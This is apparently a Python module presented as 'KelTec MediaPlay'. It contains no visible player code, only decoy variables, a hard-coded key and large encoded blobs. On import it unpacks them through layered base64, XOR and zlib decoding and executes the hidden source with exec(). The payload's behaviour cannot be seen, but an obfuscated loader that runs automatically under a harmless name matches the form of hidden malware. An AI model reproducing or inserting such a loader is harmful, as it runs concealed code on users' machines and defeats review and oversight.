# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 760788 ^ 293392
_lx1_1 = len("47a9ff")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-280892)
_lx3_3 = 908675 * 0
_lx4_4 = 939400 ^ 651299
_K = '67447b45de2d5c32f522a33e6797cdd93b8c3b24ba2ff32a6f1aa14d03128262'
_M = 'rsWrFJkJnQ73sKeLEGSATYARfR3NVZKOHk7nJZgEHIrpmvxYkEiWWvq2+YMSMNQdgEd4SphSztJLR7x5kQBM2eue/1rIHZJaqeau'
_D = 'uvH5iOYWMgQh07Eojt1DdJr2W0hgYZhixKRQxj6+NarXGKI7yQhKx/IgUiwRto7K8Bz4u3rCHWGFDeljHAo5jkFMPu2fMthpzSvy2KphwJjyqLnxqLg63cTF0jlZ43BQV/YuIQqcrroV6gFm/NgSCDSuRm25Vc64e/uWrv5yny8L6YVh5IguPrHQUrNdvimzhcJLiAf/R0gQ5frw5A0WGTTsQrImTSzHlQLydGGyHtSG6ipVJ3vH99XdlLS9xdHR6mIXHiGoSfUAv++o8CXtliaJuCgGN+eD3WBpvRQY9xBW7GGYskkfKla6YI8G4Dyyv9HM4bm+7NLjnv5zNbDadfu7A+VOWJbqzk6M4p8GfEl3+8X3qNLNiS/dpIDFALcQjd6ifrqvyWxk952LpK3KJsxVz1Dr1n7D/e4oaUHfmpNoLCGCk9l0MIZBp+DrjlsKf4MnLXguBHxn+RFAUYo2pbElVZtkO5RizlO4RkYUJ174T+QWgzlNn+mRNuLBNqZWrbnJ8mk2URs+Ny61p1ZNQ759NH1HyHYH8rFOR2pUUkvcZlY2o8rRG9nOFU/Abwntv2igzZRIW2JDQK54w4A7shKg1743JRVGgHmJbR3m0dwvqsPuLIw7/ouemQzfZkFWBUXLcjgIVRHIgj9SAPXnzo/YjnN3Obvj9WxzaZAAMIko2cFWpBA0i97my3EX+BvrD/zT30IPO23jGVdSx6K0Bf6wvpcvupwPNJ0Zgr3djL7PNwwvm1pBjtwkZQL2QwulUs6pnm4B7yi+n/mgyU3WG9daj0zLDaVYI3FYdw0RSR2klTRXzEMRsTU0lpsakzUCqQ9tavz6c0YQ6PImsLa5hw+UxE+YVp7OD3u6b4gpqGY7lqaJ+2rMiPgVEOSlYjo+gNsYgOEwk6x/8e2zH6x6APj6BEQ2pTE/3wjhj4CRtbZo/HBQYvr0J3doNjZddGthwB6KcLAI/sgff0hR1wZHE5ISQEhMVrrYEPHhbV6qdUBjDumJasA19NZQ79S8nvWD7dLL1lemuJHTkNjwmEOnhc67KH8/Ut0X9nuFy9lm9WlFRBjj5vaeQQg5hGlkZVT+bzhQC10YPXoEtwqcSh5XFwCKdVjbO9/2W5VFkZL9bTMOI8uFCnmjTlGDKMDbi1iEf1mh1+TGiCcUvxWjlgmYxMZPFqXUpcf50GU8T7bhzL10F8+bguGtRcmlWu8O/GgFo1WXasm1ZjhC9QwUAMfOiuwHANKK8yQv0As0taVNlL+P6v8UYERpKMDULx73QtpFQW4HKEULyDGsYCNoAN6JXp6E/FL8/kdvoP6JjzGRBN1hCwzldt1hpINMTumhi8Bvq365OaTcCq77UHyLuzyp99JbmPrxrlUPJcc0m2PQrqsMdXXzf1zbHfAF8YRlCYHE9uzm98ZoD5G4FEQsihWvHVR9neYb35Rf++QcpBnwHQlIwu5ZqNOq4cnIkmF5aLAr1Zk4QBM5zbHbVdKPDxqAHADKOQC1ee4fJvGQPIl2Hk8qDxE2IFATulrlJuctKyOO+Q3eSYYSLPBvhpW/ps0RZ62RwsdQpKAVxZZZESL1Z+aVe7J5C7diQO1RtsgzpWx3n4Nk0HhxU+l1O1RFSeSXcU+ZtF/Re1MUlDZgCw9gCzs9tXVW95ms5db3MDZAnFjz91nVlEaODQdaT/Zq5ftdzsxKOYMoCPOlnsw7nh5MQjqC3gVlxD6W52F5G8W15U+d64ERrGewizBlohzPOxv6RRbk+p9cwLQXI+5qoWWv8ror/PVOUU+2ejH3AoWY2CUQyvnsmywXIR4Iqdbz+8SPLSaN8XmCC3yJf467WCXMBozJa4yzhMB9exrB'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})